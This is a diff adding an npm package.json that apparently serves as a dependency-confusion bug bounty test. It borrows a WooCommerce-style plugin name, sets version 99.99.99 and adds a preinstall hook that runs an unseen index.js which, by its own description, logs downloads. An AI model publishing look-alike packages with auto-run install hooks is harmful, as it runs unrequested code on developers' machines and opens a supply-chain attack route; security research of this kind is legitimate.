@@ -1,0 +1,11 @@
+{
+    "name": "eslint-plugin-woocommerce",
+    "description": "This is a bug bounty test package. It contains no malicious content, but does log downloads.",
+    "scripts": {
+        "preinstall": "node index.js"
+    },
+    "version": "99.99.99",
+    "main": "index.js",
+    "author": "",
+    "license": "ISC"
+}
